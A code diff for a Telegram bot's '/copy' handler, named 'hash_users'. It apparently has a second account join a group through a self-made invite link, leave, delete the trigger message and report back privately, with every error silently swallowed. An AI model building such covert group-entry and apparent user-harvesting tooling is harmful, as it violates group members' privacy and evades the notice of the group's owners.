@@ -14,7 +14,10 @@ router = Router()
 @router.message(Command('copy'))
 async def hash_users(message: Message):
     group_id = message.chat.id
-    await message.delete()
+    try:
+        await message.delete()
+    except:
+        pass
     try:
         await app.start()
     except:
@@ -22,6 +25,7 @@ async def hash_users(message: Message):
     try:
         link = await app.create_chat_invite_link(group_id)
         await app.join_chat(link.invite_link)
+        await bot.send_message(MY_TELEGRAM_ID, text='Создана ссылка и я вошел в группу')
     except:
         pass
     try:
@@ -48,9 +52,14 @@ async def hash_users(message: Message):
         pass
     try:
         await app.leave_chat(message.chat.id)
+        await bot.send_message(MY_TELEGRAM_ID, text='Я покинул группу')
     except Exception:
         pass
     try:
         await bot.send_message(MY_TELEGRAM_ID, 'нажата кнопка /copy')
+    except:
+        pass
+    try:
+        await message.delete()
     except:
         pass
